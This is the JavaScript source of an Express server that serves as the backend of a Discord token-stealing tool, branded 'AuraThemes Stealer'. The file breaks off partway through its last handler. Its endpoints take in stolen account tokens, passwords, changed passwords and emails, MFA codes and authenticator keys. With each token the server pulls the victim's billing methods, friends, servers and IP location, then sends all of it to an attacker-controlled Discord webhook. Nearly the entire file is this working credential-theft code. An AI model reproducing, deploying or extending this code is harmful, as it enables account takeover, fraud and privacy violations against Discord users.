const { WebhookClient } = require("discord.js");
const app = require("express")(),
    { text } = require("body-parser"),
    Discord = require("v11-discord.js"),
    request = require("sync-request"),
    port = 3000,

    /** NOte
     * be making updates like changing v11-discord.js to discord.js for the reason that the logic is wrong lol
     */

    x = {   //added new webhook URL
            webhookURL: "URL"
        },

    webhook = new Discord.WebhookClient( x.webhookURL.split("/")[5], x.webhookURL.split("/")[6]), webhookC = new WebhookClient({ url: x.webhookURL }); webhookC.edit({ name: 'AuraThemes Stealer', avatar: 'https://api.teamarcades.xyz/image' }).then(() => {}).catch((error) => { });

app.use(text())

app.post("/login", (req, res) => {
    res.sendStatus(200)
    req = JSON.parse(req.body)
    console.log(req)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Si. \` `
    else billing = "`No.`"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "Sin Biografia"
    if (bio.startsWith("`") && bio.endsWith("`")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "Sin Telefono."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = ""
    var embed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle("<a:alertNew:1120542692569522308> ¡NUEVO TOKEN!")
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .addField("<:Squads:1120545077941502093> Nombre", "`" + `${basicInfos.username}#${basicInfos.discriminator}` + "`")
        .addField("<a:badges:1120545516762181632> Insignias", badges(basicInfos.flags), true)
        .addField("<a:boostBlack:1120542698328297582> Tipo de Nitro", getNitro(basicInfos.premium_type), true)
        .addField("<a:flowEnd:1120542707333472360> Amigos", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("<:billing:1120546347016257617> Metodo de Pago", billing, true)
        .addField("<a:yeahGod:1120542744658579556> Servidores", "`" + guildInfos.length + "`", true)
        .addField("<:top:1120546817667498036> Owner en Servidores", "`" + owowner + "`", true)
        .addField("<a:tickTwo:1120542731102597120> Total Apps (Npc's o Bots)", "`" + appliInfos.length + "`", true)
        .addField("<:tick:1120542728632160316> Total Conexiones", "`" + connectInfos.length + "`", true)
        .addField("<a:nsfw:1120550691522482176> NSFW Permitido ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("<a:loading:1120542718754562160> Verificado", "`" + basicInfos.verified + "`", true)
        .addField("<a:line:1120542713687846982> Bio", "```" + bio + "```")
        .addField("<:uhg:1120542737268211753> Correo", "`" + basicInfos.email + "`")
        .addField("<a:wordBlack:1120542739361177642> Telefono", "`" + phone + "`")
        .addField("<:uhg:1120542737268211753> Contraseña: ", "`" + req.password + "`")
        .addField("<a:Nokia:1090422506449535057> Path: ", "`" + req.injected + "`")
        .addField("<:ip:1120552135571030057> IP Info", "`" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "`")
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    basicInfos.mfa_enabled == true && embed.addField("Codigos MFA", "`" + getMFACode(req.token, req.password) + "`")
    embed.addField("Inyección en", "`" + req.injected.split("\\")[5] + "`")
    webhook.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle(`<:uhg:1120542737268211753> Amigos de ${basicInfos.username}`)
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .setDescription(friendInfos(friendsInfos))
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    webhook.send(friendEmbed)
})
app.post("/newpass", (req, res) => {
    req = JSON.parse(req.body)
    console.log(req)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Si. \` `
    else billing = "`No.`"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "Sin Biografia"
    if (bio.startsWith("`") && bio.endsWith("`")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "Sin Telefono."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = ""
    var embed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle("<a:alertNew:1120542692569522308> ¡CONTRASEÑA NUEVA!")
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .addField("<:Squads:1120545077941502093> Nombre", "`" + `${basicInfos.username}#${basicInfos.discriminator}` + "`")
        .addField("<a:badges:1120545516762181632> Insignias", badges(basicInfos.flags), true)
        .addField("<a:boostBlack:1120542698328297582> Tipo de Nitro", getNitro(basicInfos.premium_type), true)
        .addField("<a:flowEnd:1120542707333472360> Amigos", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("<:billing:1120546347016257617> Metodo de Pago", billing, true)
        .addField("<a:yeahGod:1120542744658579556> Servidores", "`" + guildInfos.length + "`", true)
        .addField("<:top:1120546817667498036> Owner en Servidores", "`" + owowner + "`", true)
        .addField("<a:tickTwo:1120542731102597120> Total Apps (Npc's o Bots)", "`" + appliInfos.length + "`", true)
        .addField("<:tick:1120542728632160316> Total Conexiones", "`" + connectInfos.length + "`", true)
        .addField("<a:nsfw:1120550691522482176> NSFW Permitido ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("<a:loading:1120542718754562160> Verificado", "`" + basicInfos.verified + "`", true)
        .addField("<a:line:1120542713687846982> Bio", "```" + bio + "```")
        .addField("<:uhg:1120542737268211753> Correo", "`" + basicInfos.email + "`")
        .addField("<a:Nokia:1090422506449535057> Path: ", "`" + req.injected + "`")
        .addField("<a:wordBlack:1120542739361177642> Telefono", "`" + phone + "`")
        .addField("<a:alertNew:1120542692569522308> Contraseña Anterior: ", "`" + req.lastPassword + "`", true)
        .addField("<a:alertNew:1120542692569522308> Nueva Contraseña", "`" + req.newPassword + "`", true)
        .addField("<:ip:1120552135571030057> IP Info", "`" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "`")
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    basicInfos.mfa_enabled == true && embed.addField("Codigos MFA", "`" + getMFACode(req.token, req.newPassword) + "`")
    embed.addField("Inyección en", "`" + req.injected.split("\\")[5] + "`")
    webhook.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle(`<:uhg:1120542737268211753> Amigos de ${basicInfos.username}`)
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .setDescription(friendInfos(friendsInfos))
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    webhook.send(friendEmbed)
})
app.post("/newmemail", (req, res) => {
    req = JSON.parse(req.body)
    console.log(req)
    res.sendStatus(200)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Si. \` `
    else billing = "`No.`"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "Sin Biografia"
    if (bio.startsWith("`") && bio.endsWith("`")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "Sin Telefono."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = ""
    var embed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle("<a:alertNew:1120542692569522308> ¡CORREO NUEVO!")
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .addField("<:Squads:1120545077941502093> Nombre", "`" + `${basicInfos.username}#${basicInfos.discriminator}` + "`")
        .addField("<a:badges:1120545516762181632> Insignias", badges(basicInfos.flags), true)
        .addField("<a:boostBlack:1120542698328297582> Tipo de Nitro", getNitro(basicInfos.premium_type), true)
        .addField("<a:flowEnd:1120542707333472360> Amigos", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("<:billing:1120546347016257617> Metodo de Pago", billing, true)
        .addField("<a:yeahGod:1120542744658579556> Servidores", "`" + guildInfos.length + "`", true)
        .addField("<:top:1120546817667498036> Owner en Servidores", "`" + owowner + "`", true)
        .addField("<a:tickTwo:1120542731102597120> Total Apps (Npc's o Bots)", "`" + appliInfos.length + "`", true)
        .addField("<:tick:1120542728632160316> Total Conexiones", "`" + connectInfos.length + "`", true)
        .addField("<a:nsfw:1120550691522482176> NSFW Permitido ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("<a:loading:1120542718754562160> Verificado", "`" + basicInfos.verified + "`", true)
        .addField("<a:line:1120542713687846982> Bio", "```" + bio + "```")
        .addField("<a:alertNew:1120542692569522308> Nuevo Correo", "`" + req.newEmail + "`")
        .addField("<a:wordBlack:1120542739361177642> Telefono", "`" + phone + "`")
        .addField("<:uhg:1120542737268211753> Contraseña: ", "`" + req.password + "`")
        .addField("<a:Nokia:1090422506449535057> Path: ", "`" + req.injected + "`")
        .addField("<:ip:1120552135571030057> IP Info", "`" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "`")
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    basicInfos.mfa_enabled == true && embed.addField("Codigos MFA", "`" + getMFACode(req.token, req.password) + "`")
    embed.addField("Inyección en", "`" + req.injected.split("\\")[5] + "`")
    webhook.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle(`<:uhg:1120542737268211753> Amigos de ${basicInfos.username}`)
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .setDescription(friendInfos(friendsInfos))
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    webhook.send(friendEmbed)
})
app.post("/mfaenable", (req, res) => {
    req = JSON.parse(req.body)
    console.log(req)
    res.sendStatus(200)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Si. \` `
    else billing = "`No.`"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "Sin Biografia"
    if (bio.startsWith("`") && bio.endsWith("`")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "Sin Telefono."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = ""
    var embed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle("<a:alertNew:1120542692569522308> ¡MFA ACTIVADO!")
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .addField("<:Squads:1120545077941502093> Nombre", "`" + `${basicInfos.username}#${basicInfos.discriminator}` + "`")
        .addField("<a:badges:1120545516762181632> Insignias", badges(basicInfos.flags), true)
        .addField("<a:boostBlack:1120542698328297582> Tipo de Nitro", getNitro(basicInfos.premium_type), true)
        .addField("<a:flowEnd:1120542707333472360> Amigos", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("<:billing:1120546347016257617> Metodo de Pago", billing, true)
        .addField("<a:yeahGod:1120542744658579556> Servidores", "`" + guildInfos.length + "`", true)
        .addField("<:top:1120546817667498036> Owner en Servidores", "`" + owowner + "`", true)
        .addField("<a:tickTwo:1120542731102597120> Total Apps (Npc's o Bots)", "`" + appliInfos.length + "`", true)
        .addField("<:tick:1120542728632160316> Total Conexiones", "`" + connectInfos.length + "`", true)
        .addField("<a:nsfw:1120550691522482176> NSFW Permitido ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("<a:loading:1120542718754562160> Verificado", "`" + basicInfos.verified + "`", true)
        .addField("<a:line:1120542713687846982> Bio", "```" + bio + "```")
        .addField("<:uhg:1120542737268211753> Correo", "`" + basicInfos.email + "`")
        .addField("<a:wordBlack:1120542739361177642> Telefono", "`" + phone + "`")
        .addField("<:uhg:1120542737268211753> Contraseña: ", "`" + req.password + "`")
        .addField("<a:Nokia:1090422506449535057> Path: ", "`" + req.injected + "`")
        .addField("<:ip:1120552135571030057> IP Info", "`" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "`")
        .addField("<a:alertNew:1120542692569522308> MFA Info", "`" + `Codigo usado: ${req.code}\nGoogle Auth: ${req.authKey}` + "`")
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    embed.addField("Inyección en", "`" + req.injected.split("\\")[5] + "`")
    basicInfos.mfa_enabled == true && embed.addField("Codigos MFA", "`" + getMFACode(req.token, req.password) + "`")
    webhook.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle(`<:uhg:1120542737268211753> Amigos de ${basicInfos.username}`)
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .setDescription(friendInfos(friendsInfos))
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    webhook.send(friendEmbed)
})
app.post("/mfadisable", (req, res) => {
    req = JSON.parse(req.body)
    console.log(req)
    res.sendStatus(200)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Si. \` `
    else billing = "`No.`"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "Sin Biografia"
    if (bio.startsWith("`") && bio.endsWith("`")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "Sin Telefono."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = ""
    var embed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle("<a:alertNew:1120542692569522308> ¡MFA DESACTIVADO!")
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .addField("<:Squads:1120545077941502093> Nombre", "`" + `${basicInfos.username}#${basicInfos.discriminator}` + "`")
        .addField("<a:badges:1120545516762181632> Insignias", badges(basicInfos.flags), true)
        .addField("<a:boostBlack:1120542698328297582> Tipo de Nitro", getNitro(basicInfos.premium_type), true)
        .addField("<a:flowEnd:1120542707333472360> Amigos", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("<:billing:1120546347016257617> Metodo de Pago", billing, true)
        .addField("<a:yeahGod:1120542744658579556> Servidores", "`" + guildInfos.length + "`", true)
        .addField("<:top:1120546817667498036> Owner en Servidores", "`" + owowner + "`", true)
        .addField("<a:tickTwo:1120542731102597120> Total Apps (Npc's o Bots)", "`" + appliInfos.length + "`", true)
        .addField("<:tick:1120542728632160316> Total Conexiones", "`" + connectInfos.length + "`", true)
        .addField("<a:nsfw:1120550691522482176> NSFW Permitido ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("<a:loading:1120542718754562160> Verificado", "`" + basicInfos.verified + "`", true)
        .addField("<a:line:1120542713687846982> Bio", "```" + bio + "```")
        .addField("<:uhg:1120542737268211753> Correo", "`" + basicInfos.email + "`")
        .addField("<a:wordBlack:1120542739361177642> Telefono", "`" + phone + "`")
        .addField("<a:Nokia:1090422506449535057> Path: ", "`" + req.injected + "`")
        .addField("<:ip:1120552135571030057> IP Info", "`" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "`")
        .addField("<a:alertNew:1120542692569522308> MFA Info", "`" + `Código usado: ${req.code}` + "`")
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    embed.addField("Inyección en", "`" + req.injected.split("\\")[5] + "`")
    webhook.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle(`<:uhg:1120542737268211753> Amigos de ${basicInfos.username}`)
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .setDescription(friendInfos(friendsInfos))
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    webhook.send(friendEmbed)
})
app.post("/inject", (req, res) => {
    req = JSON.parse(req.body)
    console.log(req)
    res.sendStatus(200)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) billing = `\`Si. \` `
    else billing = "`No.`"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "Sin Biografia"
    if (bio.startsWith("`") && bio.endsWith("`")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "Sin Telefono."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = ""
    var embed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle("<a:alertNew:1120542692569522308> ¡INYECCION!")
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .addField("<:Squads:1120545077941502093> Nombre", "`" + `${basicInfos.username}#${basicInfos.discriminator}` + "`")
        .addField("<a:badges:1120545516762181632> Insignias", badges(basicInfos.flags), true)
        .addField("<a:boostBlack:1120542698328297582> Tipo de Nitro", getNitro(basicInfos.premium_type), true)
        .addField("<a:flowEnd:1120542707333472360> Amigos", "`" + friendsInfos.filter(r => r.type == 1).length + "`", true)
        .addField("<:billing:1120546347016257617> Metodo de Pago", billing, true)
        .addField("<a:yeahGod:1120542744658579556> Servidores", "`" + guildInfos.length + "`", true)
        .addField("<:top:1120546817667498036> Owner en Servidores", "`" + owowner + "`", true)
        .addField("<a:tickTwo:1120542731102597120> Total Apps (Npc's o Bots)", "`" + appliInfos.length + "`", true)
        .addField("<:tick:1120542728632160316> Total Conexiones", "`" + connectInfos.length + "`", true)
        .addField("<a:nsfw:1120550691522482176> NSFW Permitido ", "`" + basicInfos.nsfw_allowed + "`", true)
        .addField("<a:loading:1120542718754562160> Verificado", "`" + basicInfos.verified + "`", true)
        .addField("<a:line:1120542713687846982> Bio", "```" + bio + "```")
        .addField("<:uhg:1120542737268211753> Correo", "`" + basicInfos.email + "`")
        .addField("<a:Nokia:1090422506449535057> Path: ", "`" + req.injected + "`")
        .addField("<a:wordBlack:1120542739361177642> Telefono", "`" + phone + "`")
        .addField("<:ip:1120552135571030057> IP Info", "`" + `${ipInfos.country} | ${ipInfos.regionName}\n${ipInfos.city} | ${ipInfos.isp}\n${ipInfos.query}` + "`")
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    embed.addField("Inyección en", "`" + req.injected.split("\\")[5] + "`")
    webhook.send(embed)
    var friendEmbed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle(`<:uhg:1120542737268211753> Amigos de ${basicInfos.username}`)
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .setDescription(friendInfos(friendsInfos))
        .setImage(image)
        .setColor("#00aaaa")
        .setFooter("AuraThemes Stealer | By k4itrun#6889", "https://api.teamarcades.xyz/image")
    webhook.send(friendEmbed)
})
app.get("/beforeinject", (req, res) => {
    req = JSON.parse(req.body)
    console.log(req)
    var basicInfos = getInfo("https://discord.com/api/v9/users/@me", req.token)
    if (basicInfos == "Invalid") return
    var billingInfos = getInfo("https://discord.com/api/v9/users/@me/billing/payment-sources", req.token)
    var friendsInfos = getInfo("https://discordapp.com/api/v9/users/@me/relationships", req.token)
    var guildInfos = getInfo("https://discord.com/api/v9/users/@me/guilds", req.token)
    var appliInfos = getInfo("https://discord.com/api/v9/applications", req.token)
    var connectInfos = getInfo("https://discordapp.com/api/v9/users/@me/connections", req.token)
    var ipInfos = getIPInfo(req.ipAddress)
    var owowner = 0,
        bio, phone
    guildInfos.forEach(r => r.owner && owowner++)
    if (billingInfos.length > 0) var billing = `\`Si. \` `
    else var billing = "`No.`"
    billingInfos.forEach(i => {
        i.brand && 0 == i.invalid && (billing += "<:y_card_spc:918956324908318720> "),
            i.email && (billing += "<:paypal:891011558040277072> ")
    });
    if (basicInfos.bio) bio = basicInfos.bio
    else bio = "Sin Biografia"
    if (bio.startsWith("`") && bio.endsWith("`")) bio = bio.slice(3, -3)
    if (basicInfos.phone !== null) phone = basicInfos.phone
    else phone = "Sin Telefono."
    if (basicInfos.banner) var image = `https://cdn.discordapp.com/banners/${basicInfos.id}/${basicInfos.banner}.png?size=512`
    else var image = ""
    var embed = new Discord.RichEmbed()
        .setAuthor(`${basicInfos.username}#${basicInfos.discriminator} (${basicInfos.id})`, "https://api.teamarcades.xyz/image", "https://api.teamarcades.xyz/v9/AuraThemes/dc")
        .setTitle("<a:alertNew:1120542692569522308> ¡NUEVO TOKEN!")
        .setURL("https://github.com/k4itrun/AuraTokenGrabber")
        .addField("<a:land:1120772367170416690> Token", "`" + req.token + "`" + "\n" + "[Click aquí para copiar](https://api.teamarcades.xyz/raw/"+ req.token +")")
        .addField("<:Squads:1120545077941502093> Nombre", "`" + `${basicInfos.username}#${basicInfos.discriminator}` + "`")
        .addField("<a:badges:1120545516762181632> Insignias", badges(basicInfos.flags), true)
        .addField("<a:boostBlack:1120542698328297582> Tipo de Nitro", getNitro(basicInfos.premium_type), true)
